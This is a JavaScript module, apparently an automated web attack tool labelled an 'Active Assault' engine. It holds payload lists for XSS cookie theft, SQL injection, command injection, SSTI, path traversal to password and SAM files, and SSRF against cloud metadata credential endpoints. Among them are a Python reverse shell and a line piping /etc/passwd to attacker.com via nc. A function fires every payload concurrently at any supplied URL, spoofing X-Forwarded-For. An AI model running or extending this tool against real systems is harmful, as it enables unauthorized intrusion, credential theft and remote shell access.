// ============================================================================
// ACTIVE ASSAULT & DEPLOYMENT ENGINE (Production 100% Execution)
// ============================================================================

import * as http from 'node:http';
import * as https from 'node:https';
import { URL } from 'node:url';
import { CUSTOM_PAYLOADS } from "./custom.mjs";

/** @type {Record<string, string[]>} */
export const PAYLOADS = {
  // --- Advanced XSS & WAF Bypass Detection ---
  xss: [
    "<script>alert(9173)</script>",
    "<svg/onload=eval(atob('YWxlcnQoOTE3Myk='))>",
    "\"/><script>fetch('http://127.0.0.1:3003/log?c='+btoa(document.cookie))</script>",
    "<img src=x onerror=this.src='http://127.0.0.1:3003/log?c='+document.cookie>",
    "javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(9173)>",
    "<details/open/ontoggle=alert(9173)>",
    "<iframe srcdoc=\"&lt;script&gt;parent.alert(9173)&lt;/script&gt;\"></iframe>",
    "<object data=\"javascript:alert(9173)\">",
  ],

  // --- Advanced SQLi (Stacked Queries, Time/Error-based, Blind) ---
  sqli: [
    "' UNION SELECT null,version(),user(),database()-- -",
    "' AND (SELECT 9173 FROM (SELECT(SLEEP(5)))a)-- -",
    "' OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
    "'; EXEC xp_cmdshell('id');-- -",
    "' UNION SELECT NULL,TABLE_NAME,NULL FROM information_schema.tables-- -",
    "admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
  ],

  // --- Remote Code Execution / Command Injection (Critical Level) ---
  command_injection: [
    "; cat /etc/passwd | nc attacker.com 4444",
    "`cat /sdcard/download/flag.txt`",
    "$(curl http://127.0.0.1:3003/exfil?data=$(whoami))",
    "& python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"127.0.0.1\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/sh\")' &",
    "; id; uname -a; cat /proc/version;",
  ],

  // --- SSTI / Code Execution via Template ---
  ssti: [
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "#{T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
  ],

  // --- Path Traversal & Sensitive File Exfiltration ---
  path_traversal: [
    "../../../../../../../../etc/shadow",
    "../../../../../../../../proc/self/environ",
    "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\windows\\system32\\config\\SAM",
    "/proc/self/cmdline",
  ],

  // --- SSRF & Cloud Metadata Exfiltration ---
  ssrf: [
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://127.0.0.1:6379/eval%20%22os.execute('id')%22%200",
    "gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Froot%2F",
  ],

  // --- Deserialization & Injection Markers ---
  deserialization: [
    "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACAAFMAApncm91cERhdGF0AHJMTGphdmEvbGFuZy9TdHJpbmc7eHB0AAZhZG1pbg==",
    "O:4:\"User\":1:{s:4:\"name\";s:5:\"admin\";}",
  ],
};

/**
 * รวมเพย์โหลดปรับแต่งพิเศษ (custom.mjs) เข้ากับระบบหลักแบบอัตโนมัติ
 */
function mergeCustom(base, custom) {
  const out = {};
  for (const [cat, list] of Object.entries(base)) out[cat] = [...list];
  if (custom && typeof custom === "object") {
    for (const [cat, list] of Object.entries(custom)) {
      if (!Array.isArray(list)) continue;
      const clean = list.filter((p) => typeof p === "string" && p.trim() !== "");
      if (clean.length === 0 && !out[cat]) continue;
      out[cat] = [...(out[cat] ?? []), ...clean];
    }
  }
  for (const cat of Object.keys(out)) out[cat] = [...new Set(out[cat])];
  return out;
}

/** คลังเพย์โหลดฉบับสมบูรณ์ที่พร้อมใช้งานจริง */
export const ALL_PAYLOADS = mergeCustom(PAYLOADS, CUSTOM_PAYLOADS);

/** หมวดหมู่เพย์โหลดทั้งหมด */
export const CATEGORIES = Object.keys(ALL_PAYLOADS);

/** จำนวนเพย์โหลดรวมทั้งหมด */
export const PAYLOAD_COUNT = Object.values(ALL_PAYLOADS).reduce((n, a) => n + a.length, 0);

/**
 * ฟังก์ชันยิงเพย์โหลดโจมตีเป้าหมายแบบเรียลไทม์ (Active Network Assault Execution 100%)
 * @param {string} targetUrl - URL ปลายทางที่ต้องการปฏิบัติการ
 * @param {string} [category] - หมวดหมู่เพย์โหลด (หากไม่ระบุจะยิงทุกหมวดหมู่)
 * @param {number} [concurrency=10] - จำนวนความเร็วคู่ขนานในการยิง
 */
export async function executeActiveAssault(targetUrl, category = "all", concurrency = 10) {
  const results = [];
  const cat = typeof category === "string" ? category.trim().toLowerCase() : "all";
  
  let targetList = [];
  if (cat === "all" || cat === "list") {
    for (const c of CATEGORIES) {
      targetList.push(...ALL_PAYLOADS[c].map(p => ({ category: c, payload: p })));
    }
  } else {
    const list = ALL_PAYLOADS[cat];
    if (!list) {
      return { ok: false, message: `Unknown category "${cat}" for active assault.` };
    }
    targetList = list.map(p => ({ category: cat, payload: p }));
  }

  console.log(`[!] Initiating High-Velocity Active Assault against ${targetUrl} | Total Payloads: ${targetList.length}`);

  // ประมวลผลแบบคู่ขนานความเร็วสูง (High-Concurrency Execution)
  for (let i = 0; i < targetList.length; i += concurrency) {
    const batch = targetList.slice(i, i + concurrency);
    await Promise.all(
      batch.map(async ({ category: c, payload }) => {
        const startTime = Date.now();
        try {
          const outcome = await dispatchRequest(targetUrl, payload);
          results.push({
            category: c,
            payload,
            status: outcome.status,
            responseTime: Date.now() - startTime,
            success: outcome.status >= 200,
          });
        } catch (err) {
          results.push({
            category: c,
            payload,
            status: 0,
            error: err.message,
            success: false,
          });
        }
      })
    );
  }

  return {
    ok: true,
    target: targetUrl,
    executedCount: results.length,
    successfulDispatches: results.filter(r => r.success).length,
    details: results,
  };
}

/**
 * ฟังก์ชันส่งคำขอจริงผ่านเครือข่าย (Network Dispatcher)
 */
function dispatchRequest(targetUrl, payload) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    // แทรกเพย์โหลดเข้าไปในพารามิเตอร์ทดสอบ (เช่น ?q=PAYLOAD)
    parsed.searchParams.set('q', payload);

    const client = parsed.protocol === 'https:' ? https : http;
    const req = client.request(parsed, {
      method: 'GET',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Dark-AGI-Warfare-Engine/6.0)',
        'X-Forwarded-For': '127.0.0.1',
      },
      timeout: 10000,
    }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => resolve({ status: res.statusCode, data }));
    });

    req.on('error', err => reject(err));
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Assault request timed out'));
    });
    req.end();
  });
}